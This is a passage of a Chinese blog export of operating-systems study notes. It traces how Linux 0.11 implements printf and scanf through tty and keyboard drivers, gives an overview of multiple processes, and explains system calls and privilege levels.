<h2 id="从printf开始"><a href="#从printf开始" class="headerlink" title="从printf开始"></a>从printf开始</h2><p><code>printf</code>在执行时会先<strong>创建缓存buf</strong>并将格式化输出写到这个缓存，之后调用<code>write(1,buf,...)</code></p>
<p>而根据第二节<strong>系统调用</strong>的学习，<code>write</code>最终会落到<code>sys_write()</code>上，前面我们介绍printf时到这里就停止了，因为后续内容就涉及到了<strong>硬件驱动</strong>所以就没有继续讲下去。下面我们就要由<strong>sys_write()<strong>继续探索</strong>printf的实现流程</strong>.</p>
<blockquote>
<p><code>sys_write</code>的代码1：<strong>寻找设备文件的FCB</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661051975352.png"></p>
<p><code>sys_write</code>的<strong>第一部分代码</strong>就是要<strong>找到设备信息并将其保存起来</strong>，是通过上图所示的<strong>3条代码</strong>实现的。<br>这三句代码很简单，首先<strong>定义一个变量file</strong>，而后将其赋值为<strong>一个数组中元素的值</strong>，再之后取<strong>这个元素的某个值</strong>赋给<strong>inode变量</strong>。不过要想真正了解其含义，还需要很多相关知识，下面我们具体介绍.</p>
<ol>
<li><code>current—&gt;filp[fd]</code>中，<code>filp</code>中存放了<strong>当前进程打开的文件</strong>，而后可以<strong>通过文件句柄也就是fd</strong>获取这些文件。</li>
<li><code>file-&gt;f_inode</code>中，通过前面获取到的文件即可得到<strong>文件FCB</strong>，FCB中<strong>存储着设备信息</strong>。</li>
</ol>
<p>上两行代码实现了<strong>文件PCB的获取</strong>(<code>到这里就完成了代码的介绍，下面内容为扩展知识</code>），但是要想知道<strong>filp和inode</strong>的结构与值要从<strong>进程建立</strong>讲起.</p>
<blockquote>
<p><strong>扩展1：filp的结构</strong></p>
<blockquote>
<p>前面我们说过，filp存储着当前进程打开的文件，其中fd为1对应的文件是标准输出，这是所有进程都要打开的文件。而根据fork()建立进程的流程来看，子进程是通过复制父进程来建立的，所以最开始打开这个文件的就是1号进程，具体来说，是在init()程序中打开的这个文件。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661053223948.png"><br>如图所示，1号进程会打开tty0,之后两次dup(0)使fd为1、2的也指向tty0(dup指令用于将上一个fd的内容复制到下一个fd)。所以filp[1]就是获取到tty0这个设备文件也就是显示器（tty是终端设备）。</p>
</blockquote>
</blockquote>
<blockquote>
<p>扩展2：inode的值</p>
<blockquote>
<p>通过file-&gt;f_inode获取的值就是文件“&#x2F;dev&#x2F;tty0”的属性信息。</p>
</blockquote>
</blockquote>
<h2 id="文件视图的大量分支"><a href="#文件视图的大量分支" class="headerlink" title="文件视图的大量分支"></a>文件视图的大量分支</h2><blockquote>
<p><code>sys_write</code>代码2：<strong>根据文件属性进行分支</strong></p>
</blockquote>
<p>当获取到<strong>文件属性</strong>后，就要根据此数据判断<strong>需要跳到的地方</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661053692214.png"></p>
<p><code>sys_write</code>函数接着<strong>向下执行</strong>，这一句为一个<strong>if判断语句</strong>。其作用是<strong>判断该文件是否为一个字符设备</strong>，如果是就跳转到<code>rw_char函数</code>执行。</p>
<p>显然，<strong>显示器</strong>也就是tyy0是一个<strong>字符设备</strong>，所以会跳转到<code>rw_char()</code>。我们需要关注的是此函数的<strong>前两个参数</strong>：</p>
<ul>
<li><code>WRITE</code>用于标明<strong>write</strong>，便于后续调用</li>
<li><code>inode-&gt;i_zone[0]</code>中存储着该设备的<strong>主设备号和次设备号</strong></li>
</ul>
<blockquote>
<p><code>rw_char()</code>函数与<code>rw_ttyx()</code>函数介绍</p>
</blockquote>
<p>此函数是<strong>判断设备为字符设备</strong>时要跳转的函数，其<strong>具体代码</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661064230158.png"></p>
<p>上图中的两个函数是<strong>嵌套执行</strong>的，即：首先在<code>rw_char()</code>函数中通过使用主设备号查询<code>crw_table</code>获取到某函数地址（也就是<code>rw_ttyx</code>函数）</p>
<p>之后跳转到<code>rw_ttyx</code>函数执行，此函数会<strong>判断tty的类型</strong>：<code>READ</code>还是<code>WRITE</code>，进而跳转到<code>tty_read</code>或者<code>tty_write</code>。其中t<strong>ty_write就是操作显示器的真正函数</strong>。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>前面我介绍了<code>printf</code>实现的部分流程：先使用<code>write</code>这一系统调用<strong>进入内核</strong>，而后通过<strong>中断、查表、跳转</strong>等操作执行<code>sys_write</code>函数。此函数会根据<code>fd</code>值获取<strong>设备文件与文件属性</strong>；而后通过此属性进行<strong>多次分支</strong>，最终到达<code>tty_write</code>。<br>但是到达<code>tty_write</code>还不是最后的代码，只是此函数<strong>真正涉及到显示器的操作</strong>，其中还保护很多其他函数，我们来<strong>一一介绍</strong>、</p>
</blockquote>
</blockquote>
<h2 id="到达-mov-ax-pos"><a href="#到达-mov-ax-pos" class="headerlink" title="到达 mov ax,[pos]"></a>到达 mov ax,[pos]</h2><blockquote>
<p>tty_write函数介绍：将字符串放到缓存队列</p>
</blockquote>
<p><code>tty_write</code>函数的<strong>核心代码</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661065283409.png"></p>
<p>此函数主要完成<strong>以下三个功能</strong>：</p>
<ol>
<li>框1代码主要用于<strong>获取缓存队列</strong>并判断是否<strong>满队列</strong>（缓存队列为<code>tty-&gt;write_q</code>)</li>
<li>框2代码主要用于<strong>将内存中的字符串放到这个缓存队列</strong>里</li>
<li>框3代码主要用于调用新的函数。其实<code>tty-&gt;write(tty)</code>调用的函数是<code>con_write</code>函数、</li>
</ol>
<p>当printf的输出内容<strong>输出完毕</strong>或者<strong>对列已满</strong>时，调用<code>con_write()</code>。</p>
<blockquote>
<p>con_write函数介绍：<strong>将字符串真正打印到屏幕上</strong></p>
</blockquote>
<p><code>con_write</code>函数的<strong>核心代码</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661065786887.png"></p>
<p>此函数用到了一段<strong>嵌入式汇编代码</strong>，如上图所示。其中<code>c</code>为要输出的字符串，是在缓存队列中取得的；<code>attr</code>为显示属性；最后<strong>将ax放到pos处</strong>完成打印。</p>
<p>其中<strong>pos为显存的当前光标位置</strong>，所以<code>con_write</code>函数的本质就是：<code>mov ax,[pox]</code></p>
<hr>
<blockquote>
<p><strong>printf使用总结</strong></p>
<blockquote>
<p>一个完整的<strong>文件视图路线</strong>：<code>printf</code>-&gt;<code>write</code>-&gt;<code>sys_write</code>-&gt;<code>rw_char</code>-&gt;<code>rw_ttyx</code>-&gt;<code>tty_write</code>-&gt;<code>write_q-</code>&gt;<code>con_write</code>-&gt;<code>mov ax,[pos]</code></p>
</blockquote>
</blockquote>
<h1 id="键盘的驱动"><a href="#键盘的驱动" class="headerlink" title="键盘的驱动"></a>键盘的驱动</h1><blockquote>
<p>前面我们介绍了显示器的打印在，是从<strong>上层到下层</strong>，由文件到驱动。而这里要介绍的键盘操作，是从<strong>下层到上层</strong>，从驱动到文件。</p>
</blockquote>
<h2 id="从键盘中断开始"><a href="#从键盘中断开始" class="headerlink" title="从键盘中断开始"></a>从键盘中断开始</h2><blockquote>
<p>键盘的故事应从<strong>键盘中断</strong>开始，<code>0x21号中断</code>就是键盘中断。</p>
</blockquote>
<blockquote>
<p>代码1：<strong>键盘中断初始化</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661067052003.png"></p>
<p>对于上图代码，我们只需要知道框中的两行即可：</p>
<ul>
<li><code>inb $0x60,%al</code>：与<code>out</code>指令对应，<code>inb</code>指令用于从设备取出内容，这里是将键盘的0x60端口获取按键扫描码</li>
<li><code>call key_table(,%eax,4)</code>：根据按键扫描码调用不同的按时来处理各个按键。</li>
</ul>
<p><strong>注</strong>：<code>key_table</code>通过扫描码决定处理函数，绝大多数按键都是<code>do_self()</code>函数来进行处理。</p>
<blockquote>
<p>代码2：<code>do_self函数</code>来处理按键</p>
</blockquote>
<p>do_self函数主要完成以下三个工作：</p>
<ol>
<li>根据<strong>按键扫描码</strong>获取其ASCII码</li>
<li>找到<code>tty_table[0].read_q</code>作为缓存队列</li>
<li>将ASCII码放到<code>read_q</code>中</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661067479604.png"></p>
<h2 id="缓冲队列到scanf"><a href="#缓冲队列到scanf" class="headerlink" title="缓冲队列到scanf"></a>缓冲队列到scanf</h2><blockquote>
<p>将ASCII码放到缓冲队列后，就要<strong>返回文件视图</strong></p>
</blockquote>
<p>键盘中断初始代码在使用do_self处理完字符串后就要调用do_tty_interrupt返回文件视图；而后此函数返回需要调用copy_to_cooked()函数来处理缓存队列。这两个函数的代码如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661070064607.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661070082983.png"></p>
<p>其中copy_to_cooked函数的核心代码有三行：第一行从缓存队列取ASCII码；第二行将ASCII码放到tty-&gt;secondary队列；第三行代码会唤醒此队列上的进程。</p>
<p>而唤醒的这个进程就是用户发起的<code>scanf程序</code>，此程序会执行顺序<code>read</code>-&gt;<code>sys_read</code>-&gt;<code>rw_char</code>-&gt;<code>rw_tyyx</code>-&gt;<code>tyy_read</code>,而最后的tyy_read会使得此进程阻塞（<strong>如果secondary为空的话</strong>）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661070823230.png"></p>
<blockquote>
<p>所以：<strong>键盘中断</strong>与<strong>scanf程序</strong>属于<strong>双向奔赴</strong>了，前者通过中断程序将<strong>键盘输入放到缓存队列</strong>并转移到secondary,后者则是从<strong>用户程序</strong>出发进入<strong>系统调用</strong>最后<strong>睡眠等待唤醒</strong>。</p>
</blockquote>
<hr>
<hr>
<blockquote>
<p><strong>写在最后</strong>：总结</p>
<blockquote>
<p>本篇文章记录了<strong>IO设备驱动的管理</strong>，从<strong>文件视图</strong>出发，借助<code>printf</code>和<code>scanf</code>实现显示器和键盘的操作。<br>后面将会介绍<strong>磁盘</strong>的相关知识，包括<strong>文件系统</strong>部分内容 。</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第三节）操作系统--多进程图谱概述</title>
    <url>/2022/08/09/%EF%BC%88%E7%AC%AC%E4%B8%89%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%9B%BE%E8%B0%B1%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：本篇文章参考哈工大操作系统课程。主要是对操作系统中多进程图谱的<strong>概述</strong>，为下几节内容做好铺垫。</p>
</blockquote>
<h1 id="CPU管理的直观想法"><a href="#CPU管理的直观想法" class="headerlink" title="CPU管理的直观想法"></a>CPU管理的直观想法</h1><blockquote>
<p>由cpu的管理引出了<code>多进程图谱</code>，进而带动其他硬件设备的管理。</p>
</blockquote>
<h2 id="CPU的使用"><a href="#CPU的使用" class="headerlink" title="CPU的使用"></a>CPU的使用</h2><blockquote>
<p>管理cpu之前首先要使用cpu，而管理的目的就是为了让cpu的使用更加高效。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009409027.png"></p>
<blockquote>
<p>如上图所示，CPU的<strong>工作原理</strong>：<code>取指-执行</code>。</p>
</blockquote>
<p>即根据<strong>PC地址</strong>获取内存中存储的代码并解析执行之，同时累加读取后续代码进行下一步操作。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009448117.png"></p>
<blockquote>
<p>所以管理cpu的一个<strong>最直观的方法</strong>就是：<code>设置好初PC地址</code>。</p>
</blockquote>
<h2 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h2><blockquote>
<p>到这里，有一个问题：<code>CPU的利用率</code>。我们以<strong>下面这个程序</strong>为例：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009466756.png"></p>
<p>如图所示，一个<strong>含有IO指令</strong>的程序比之不含有IO指令的程序要慢很多。</p>
<p>所以我们就会面临一个问题：<strong>在执行IO指令时CPU要干什么，是等待还是执行其他程序</strong>？</p>
<h2 id="问题的解决"><a href="#问题的解决" class="headerlink" title="问题的解决"></a>问题的解决</h2><blockquote>
<p>解决方法：<code>多程序交替执行</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009487787.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009503046.png"></p>
<p>上图可见，通过交替执行程序可以显著<code>提高利用率</code>。而利用率的提高不就是<strong>CPU管理的目的</strong>吗。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009581678.png"></p>
<p>问：如何进行程序的<strong>交替执行</strong>呢？<br>答：通过<strong>修改PC指针</strong>即可完成。</p>
<hr>
<blockquote>
<p>新问题：<strong>只是修改寄存器PC就可以了吗</strong>？</p>
<blockquote>
<p>回答：<strong>不</strong>。还需要<strong>记录信息</strong>：<code>切换前后程序的状态要保存</code>。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009671038.png"></p>
<p>如图所示，进行查询的交替执行时不仅仅要进行<strong>PC的修改</strong>，还要保存好每一个程序的<code>状态信息</code>。</p>
<p>因为运行中的程序与静态程序是不一样的，为此我们引入<code>进程</code>的概念。</p>
<h2 id="进程的引入"><a href="#进程的引入" class="headerlink" title="进程的引入"></a>进程的引入</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660009790779.png"></p>
<p>进程就是<code>正在执行的程序</code>。而<code>多进程的并发</code>执行就是<strong>CPU管理</strong>的核心部分。</p>
<p>下面我们将接着进程的概念进行介绍，搭建起一个大概的多进程图像。</p>
<h1 id="多进程图像"><a href="#多进程图像" class="headerlink" title="多进程图像"></a>多进程图像</h1><blockquote>
<p>前面我们介绍了：<code>为什么要有多进程</code><br>下面就要来看：操作系统<code>如何实现多进程</code>。</p>
</blockquote>
<h2 id="什么是多进程图像"><a href="#什么是多进程图像" class="headerlink" title="什么是多进程图像"></a>什么是多进程图像</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013773314.png"></p>
<blockquote>
<p>在<strong>用户层面</strong>：多进程图像就是打开了<strong>多个应用程序</strong><br>在<strong>操作系统层面</strong>：多进程图像就是<strong>管理好这些进程</strong>，记录这些进程的状态信息、资源调度等,负责各个进程的推进。</p>
</blockquote>
<hr>
<blockquote>
<p>系统的第一个进程</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013799962.png"></p>
<p>如图所示，就是一个多进程的例子：首先启动<strong>1号进程</strong>也就是<code>shell进程</code>，此进程通过<code>fork()</code>创建新的进程执行用户指令。一个进程执行完毕后可以通过<code>exit()</code>退出（shell进程不会退出）。</p>
<p>每执行一个任务都要<strong>启动一个进程</strong>，通过多个进程的推进实现计算机工作。</p>
<hr>
<blockquote>
<p>一个直观的画面：<code>任务管理器</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013848188.png"></p>
<p>如图所示，我们的计算机中正在执行很多进程。 <strong>操作系统就是通过管理进程来管理计算机的使用</strong>。</p>
<h2 id="如何实现多进程图像"><a href="#如何实现多进程图像" class="headerlink" title="如何实现多进程图像"></a>如何实现多进程图像</h2><blockquote>
<p>之后几个部分会详细介绍多进程图像的实现，这个部分主要是一个<strong>引子</strong>。</p>
</blockquote>
<hr>
<blockquote>
<p>多进程的组织方式：<code>PCB+状态+队列</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013875912.png"></p>
<p>如图所示，进程有三个状态：<code>运行态</code>、<code>就绪态</code>、<code>阻塞态</code></p>
<p>将<code>PCB</code>放在<strong>不同的区域</strong>以标识进程的不同状态，这些区域叫做<code>队列</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013890463.png"></p>
<p>通过<code>进程状态的转换</code>来实现进程的<strong>管理</strong>。</p>
<hr>
<blockquote>
<p>多进程的交替实现：<code>队列操作+调度+切换</code></p>
</blockquote>
<p>我们以具体的代码来看多进程交替的实现思路，这也是<strong>并发的基本含义</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013920536.png"></p>
<p>一个很关键的函数：<code>schedule()</code>。<br>其作用就是<code>实现进程状态的转换</code>，即<code>pCur</code>和<code>pNew</code>的切换。</p>
<blockquote>
<p>当然其中涉及到<strong>进程的调度问题</strong>也就是<code>getNext</code>：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013945311.png"></p>
<p><code>进程的调度</code>是一个<strong>很复杂、深刻</strong>的问题，后面会专门拿出<strong>一个部分</strong>具体介绍，当然也是介绍一些简单的调度策略。</p>
<blockquote>
<p>进程的切换也就是<code>switch_to()</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013959356.png"></p>
<ul>
<li>首先这个函数实现了<strong>进程状态信息的保存</strong>，将<code>pCur</code>信息保存到对应的PCB中。</li>
<li>之后实现<strong>进程的切换</strong>，即将<code>pNew</code>信息传入CPU中</li>
</ul>
<hr>
<blockquote>
<p>多进程的相互影响：<strong>内存冲突问题</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013973508.png"></p>
<blockquote>
<p>问题：多个进程的内存空间存在冲突。</p>
</blockquote>
<blockquote>
<p>解决方法：多进程的<code>内存分离</code>，通过<code>映射表</code>实现。（是后面内存管理的主要内容）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013985191.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660013996263.png"></p>
<hr>
<blockquote>
<p>多进程的合作</p>
</blockquote>
<p>通过下面几个例子来理解<strong>多进程之间的合作</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660014009497.png"></p>
<p><code>共享数据</code>在<strong>多进程交替执行</strong>时可能会出现问题。<br>例如发生以下问题：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660014052809.png"></p>
<p>因为交替执行程序，可以导致共享变量的<strong>错误赋值</strong>，从而影响到整个程序的执行。</p>
<blockquote>
<p>解决方法：<code>进程同步</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660014080178.png"></p>
<p>通过<code>锁机制</code>来实现进程的同步以实现进程的<code>合理推进</code>。</p>
<hr>
<blockquote>
<p>一个总结：</p>
</blockquote>
<p>第二部分主要是介绍一下多进程图像的组织与切换问题，为之后的学习打好基础。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660014152826.png"></p>
<p>下面我们也将根据上图介绍，用<strong>4个部分内容</strong>介绍多进程图像这一核心模块。</p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第二节）操作系统--接口与调用</title>
    <url>/2022/08/06/%EF%BC%88%E7%AC%AC%E4%BA%8C%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E6%8E%A5%E5%8F%A3%E4%B8%8E%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：这一部分属于操作系统的第二部分，接着第一部分（操作系统的启动）介绍。</p>
<blockquote>
<p>刚开始就提到，学习操作系统的步骤：从应用程序，穿透操作系统，实现硬件的功能。而这一节就是接收应用程序如何到达操作系统的。</p>
</blockquote>
</blockquote>
<p>应用程序要到达操作系统需要经过接口，而接口的介绍分为以下两个部分：接口的定义、接口的实现</p>
<h1 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h1><h2 id="什么是接口"><a href="#什么是接口" class="headerlink" title="什么是接口"></a>什么是接口</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659356354097.png"></p>
<p>接口，顾名思义，就是<strong>连接两个东西</strong>的媒介。通过接口，实现这两个东西的<strong>信号转换</strong>，同时向上层<strong>屏蔽</strong>了底层的实现<strong>细节</strong>。</p>
<h2 id="什么是操作系统接口"><a href="#什么是操作系统接口" class="headerlink" title="什么是操作系统接口"></a>什么是操作系统接口</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659356553310.png"></p>
<p>操作系统接口可以套用接口的定义，只不过对于所连接的两个东西有了具体而明确的定义：<code>上层用户</code>（应用系统）和<code>操作系统</code>（软件系统）。</p>
<p>上层用户通过<strong>接口</strong>对操作系统进行操作以实现对应的功能。<strong>那么用户是怎么使用操作系统的呢</strong>？</p>
<h2 id="用户使用操作系统的三种情景"><a href="#用户使用操作系统的三种情景" class="headerlink" title="用户使用操作系统的三种情景"></a>用户使用操作系统的三种情景</h2><blockquote>
<p>用户通过以下三种方式使用操作系统，或许还有许多更加复杂的场景，但是归根结底还是以下三种方式。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659356813830.png"></p>
<h4 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h4><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659356832989.png"></p>
<p>上图给出了用户使用命令行使用操作系统的示例：用户在命令行输入相应指令，而操作系统进行执行实现输出功能。</p>
<p>shell本身也是一段程序，并且是操作系统在完成初始化后调用执行的。其作用就是：建立一个死循环，接收指令并执行之。</p>
<h4 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h4><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659357038843.png"></p>
<p>上图给出了用户使用图形界面使用操作系统的实例：一个输入文字并保存到txt文件的例子。</p>
<p>图形界面的使用要涉及到消息机制，即如上图所示，通过消息队列实现消息的获取，而后调用fopen函数实现写入。</p>
<h2 id="什么是操作系统接口2"><a href="#什么是操作系统接口2" class="headerlink" title="什么是操作系统接口2"></a>什么是操作系统接口2</h2><p>前面我们介绍说操作系统接口就是连接上层用户和操作系统的媒介，这是从整体功能上进行的定义。</p>
<p>通过上文介绍的三种情景，我们可以给出操作系统接口更加具体的定义：系统调用。</p>
<blockquote>
<p>什么是系统调用？</p>
</blockquote>
<p>答案很简单：就是一些定义好的具体的<code>函数</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659357408523.png"></p>
<p>上图给出了一些常见的系统调用，<a href="https://www.cnblogs.com/shijiaqi1066/p/5749030.html">更多请参考</a>。</p>
<h1 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h1><h2 id="从一个直观想法出发"><a href="#从一个直观想法出发" class="headerlink" title="从一个直观想法出发"></a>从一个直观想法出发</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659924382661.png"></p>
<p>加入我们想要实现<strong>whoami</strong>的功能，一个比较直观的想法就是使用jmp跳转到指定位置执行指令，打印字符串即可。</p>
<p>但是这种操作是<code>不可以</code>的！</p>
<h2 id="为什么不可以？"><a href="#为什么不可以？" class="headerlink" title="为什么不可以？"></a>为什么不可以？</h2><p><strong>安全问题</strong>。如果一个用户态程序可以随意访问内核态区域，就可能会造成系统信息的泄露、破坏系统结构等。</p>
<h2 id="如何保证不可以？"><a href="#如何保证不可以？" class="headerlink" title="如何保证不可以？"></a>如何保证不可以？</h2><blockquote>
<p>通过内核态和用户态来区分“门里”和“门外”</p>
</blockquote>
<h4 id="内核态和用户态"><a href="#内核态和用户态" class="headerlink" title="内核态和用户态"></a>内核态和用户态</h4><ul>
<li><code>内核态</code>：<strong>操作系统代码</strong>执行时的状态</li>
<li><code>用户态</code>：<strong>应用程序代码</strong>执行时的状态</li>
</ul>
<p>不论是内核态代码还是用户态代码都是载入内存中执行的，只是其存储的位置不同。我们将存储内核态代码的区域称为<code>内核态区域</code>，反之则为<code>用户态区域</code>。</p>
<p>而位于用户态区域的代码不能进去内核态区域，即<strong>无法jmp到内核代码，也无法通过mov获取内核态区域数据</strong>。</p>
<h4 id="特权级与特权环"><a href="#特权级与特权环" class="headerlink" title="特权级与特权环"></a>特权级与特权环</h4><blockquote>
<p>通过给定代码和区域的特权级别来判断是否可以执行对应指令。</p>
</blockquote>
<p>先看下图：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659577469732.png"></p>
<ul>
<li><code>CPL</code>:当前特权级，用于表示当前执行指令的特权级</li>
<li><code>DPL</code>:描述符特权级，用于表示目标区域的特权级</li>
</ul>
<blockquote>
<p>如何获取特权级？</p>
</blockquote>
<ul>
<li>CPL放置在<strong>CS寄存器</strong>中，使用<code>最后两位二进制</code>数来表示特权级。需要注意的是，这里的CS是指当前代码所处的CS.</li>
<li>DPL放置在<strong>GDT表</strong>中，通过段描述符获取目标区域的特权级（<code>第2、3位二进制</code>数表示）</li>
</ul>
<hr>
<p>当获取到CPL和DPL后，就可以比较其大小，当CPL&gt;&#x3D;DPL时可以执行当前代码。<br>通过特权级的方式即可实现操作系统核心代码的安全性：当GDT表初始化后，操作系统内核代码区域的<strong>DPL就被设置为0</strong>；而对于用户态代码，<strong>其CPL为3</strong>，<code>DPL&lt;CPL</code>，所以保证用户无法直接访问内核代码。</p>
<h2 id="如何实现可以？"><a href="#如何实现可以？" class="headerlink" title="如何实现可以？"></a>如何实现可以？</h2><blockquote>
<p>既然用户态代码无法访问内核态区域，那么我们该如何操作以实现此操作呢？</p>
<blockquote>
<p>通过<code>中断</code>！</p>
</blockquote>
</blockquote>
<p>操作系统给上层应用提供了<code>int 0x80</code>号中断，可以进入对应的中断处理程序，而这也是<code>唯一的进入内核的方法</code>。</p>
<h4 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h4><blockquote>
<p>为了保证用户态代码可以正常执行中断指令，提供以下规范：</p>
</blockquote>
<ol>
<li><p>中断处理程序的目标区域的DPL被设置为3，这样就可以保证用户态也可以正常访问。</p>
</li>
